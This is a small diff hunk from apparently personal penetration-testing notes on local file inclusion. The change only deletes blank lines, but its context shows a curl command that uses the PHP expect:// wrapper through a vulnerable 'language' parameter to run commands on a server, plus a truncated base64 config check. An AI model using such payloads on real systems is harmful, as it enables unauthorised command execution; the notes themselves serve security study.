@@ -71,8 +71,6 @@ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep 
 curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://<command>"
 ```
 
-
-
 #### Accessing Inside Compressed Files (ZIP and RAR)
 See [[LFI and File Uploads]] for methods for uploading and abusing archived files... slightly different from the technique below
 
